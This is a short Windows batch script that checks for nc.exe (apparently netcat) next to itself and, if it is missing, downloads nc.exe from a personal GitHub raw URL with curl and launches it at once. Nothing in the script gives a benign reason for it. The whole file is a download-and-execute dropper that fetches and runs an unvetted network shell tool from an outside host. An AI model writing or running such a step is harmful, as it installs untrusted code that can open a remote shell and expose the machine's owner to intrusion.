@echo off
setlocal enabledelayedexpansion

if exist "%~dp0nc.exe" (
    echo File found
) else (
    curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
    
    exit
)
exit
